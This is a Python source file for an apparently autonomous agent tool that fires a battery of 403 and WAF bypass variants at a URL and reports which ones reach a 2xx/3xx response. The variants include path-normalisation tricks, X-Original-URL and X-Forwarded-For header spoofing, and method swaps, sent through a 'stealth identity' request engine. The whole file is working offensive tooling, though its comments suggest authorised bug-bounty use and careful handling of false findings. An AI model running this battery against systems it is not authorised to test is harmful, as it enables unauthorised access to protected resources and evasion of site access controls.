"""bypass_403 — the 403 breaker.

One tool call = a full battery of known access-control / WAF filter
bypass variants against one URL, each fired through the http_request
engine (so it inherits stealth identity, cookie session, and the
program rate limiter — pacing is never violated). The verdict table
shows exactly which variant changed the response.

The agent calls this explicitly when a 403 blocks a path worth taking.
"""

from __future__ import annotations

import re

_STATUS_RE = re.compile(r"^Status:\s*(\d+)", re.MULTILINE)


def _status_of(result: str) -> int:
    m = _STATUS_RE.search(str(result or ""))
    return int(m.group(1)) if m else 0


def _len_of(result: str) -> int:
    return len(str(result or ""))


def _variants(url: str) -> list[tuple[str, str, dict, str]]:
    """(method, url, headers, description) — every classic 403 bypass."""
    if "://" not in url:
        url = "https://" + url
    m = re.match(r"^(https?://)([^/]+)(.*)$", url)
    if not m:
        return []
    scheme, host, path = m.groups()
    path = path or "/"
    if not path.startswith("/"):
        path = "/" + path
    stem = path.rstrip("/")
    v: list[tuple[str, str, dict, str]] = []

    # ---- path normalization tricks ----
    v.append(("GET", f"{scheme}{host}{stem}/.", {}, "path /x/."))
    v.append(("GET", f"{scheme}{host}{stem}//", {}, "path /x//"))
    v.append(("GET", f"{scheme}{host}//{stem.lstrip('/')}", {}, "path //x (double slash prefix)"))
    v.append(("GET", f"{scheme}{host}{stem}/%2e", {}, "path /x/%2e"))
    v.append(("GET", f"{scheme}{host}{stem}/..;/", {}, "path /x/..;/ (Tomcat/Node proxy)"))
    v.append(("GET", f"{scheme}{host}{stem};.js", {}, "path /x;.js (suffix append)"))
    v.append(("GET", f"{scheme}{host}{stem}%20", {}, "path /x%20 (trailing space)"))
    v.append(("GET", f"{scheme}{host}{stem}%09", {}, "path /x%09 (trailing tab)"))
    v.append(("GET", f"{scheme}{host}{stem}/%2f%2e%2f", {}, "path double-encode traverse"))
    if len(stem) > 1:
        caps = scheme + host + stem.lower()
        v.append(("GET", caps, {}, "path lowercase variant"))
        mixed = "".join((c.upper() if i % 2 else c.lower()) for i, c in enumerate(stem))
        v.append(("GET", f"{scheme}{host}{mixed}", {}, "path mixed-case variant"))

    # ---- header injection ----
    v.append(("GET", url, {"X-Original-URL": stem}, "header X-Original-URL"))
    v.append(("GET", url, {"X-Rewrite-URL": stem}, "header X-Rewrite-URL"))
    v.append(("GET", url, {"X-Override-URL": stem}, "header X-Override-URL"))
    v.append(("GET", url, {"X-Forwarded-For": "127.0.0.1"}, "header XFF 127.0.0.1"))
    v.append(("GET", url, {"X-Forwarded-Host": host, "X-Host": host}, "headers X-Forwarded-Host + X-Host"))
    v.append(("GET", url, {"Referer": f"{scheme}{host}{stem}"}, "header same-origin Referer"))

    # ---- method games ----
    v.append(("POST", url, {}, "method POST instead of GET"))
    v.append(("HEAD", url, {}, "method HEAD"))
    v.append(("GET", url, {"X-HTTP-Method-Override": "POST"}, "header X-HTTP-Method-Override: POST"))
    v.append(("PATCH", url, {}, "method PATCH"))

    # ---- path as parameter ----
    v.append(("GET", f"{scheme}{host}/?url={stem}", {}, "param ?url=/x"))
    v.append(("GET", f"{scheme}{host}/?path={stem}", {}, "param ?path=/x"))
    v.append(("GET", f"{scheme}{host}{stem}?_cb={int(__import__('time').time())}", {}, "cache-buster param"))

    return v


def bypass_403(url: str) -> str:
    """Battery of 403-bypass variants; verdict table of what changed."""
    try:
        from suijin.modules.tools.lib.http_tools import http_request

        variants = _variants(url)
        if not variants:
            return f"Error: could not parse URL '{url}'"

        baseline = http_request("GET", url)
        base_status = _status_of(baseline)
        # THE BASELINE GUARD: run this battery only on an actual 403. On a
        # 200/404 baseline, ANY status difference used to count as a "win"
        # — a live probe returned "13/24 variants changed the status" with
        # 404s and 501s listed as bypasses. That verdict is worse than
        # useless: it invites a false finding.
        if base_status == 0:
            return f"Error: baseline request failed (no status parsed) — last output:\n{str(baseline)[:300]}"
        if base_status != 403:
            return (
                f"bypass_403 is for 403s — the baseline for this URL is {base_status}, nothing to bypass. "
                "Re-check the path or use http_request directly."
            )

        rows: list[str] = []
        wins: list[str] = []
        inconclusive = 0
        for method, vurl, headers, desc in variants:
            res = http_request(method, vurl, headers=headers)
            st = _status_of(res)
            n = _len_of(res)
            mark = ""
            if st == 0:
                # RATE LIMITED / transport error — the variant says NOTHING
                # about enforcement. Counting these as "held" produced a
                # confident "enforced" verdict on unanswered questions.
                inconclusive += 1
                mark = " ? inconclusive"
            elif 200 <= st < 400:
                mark = " ← BYPASSED"
                wins.append(f"{desc} → {st}")
            elif st != base_status:
                mark = " ≠ changed"  # different, but NOT better access
            elif n and abs(n - _len_of(baseline)) > 400:
                mark = " ~ body diff"
            rows.append(f"  {st:>3}  {len(str(res)):>6}B  {desc}{mark}")

        header = [
            f"bypass_403 battery — {len(variants)} variants against {url}",
            f"baseline: {base_status}",
            "-" * 64,
        ]
        if wins:
            verdict = f"\nVERDICT: {len(wins)}/{len(variants)} variant(s) reached a 2xx/3xx response:"
            verdict += "".join(f"\n  • {w}" for w in wins)
            verdict += (
                "\nConfirm the changed response actually reaches the protected resource before recording a finding."
            )
        elif inconclusive:
            verdict = (
                f"\nVERDICT: inconclusive — {inconclusive}/{len(variants)} variants returned no status "
                "(rate-limited or transport error). Retry later; do NOT record this as enforced."
            )
        else:
            verdict = "\nVERDICT: 0 bypasses — the 403 held across every variant. Record as enforced and move on."
        if inconclusive and wins:
            verdict += f"\n({inconclusive} variant(s) were inconclusive and are not counted either way.)"
        return "\n".join(header + rows + [verdict])
    except Exception as e:  # noqa: BLE001 — tools return strings, never raise
        return f"Error: bypass_403 failed: {e}"
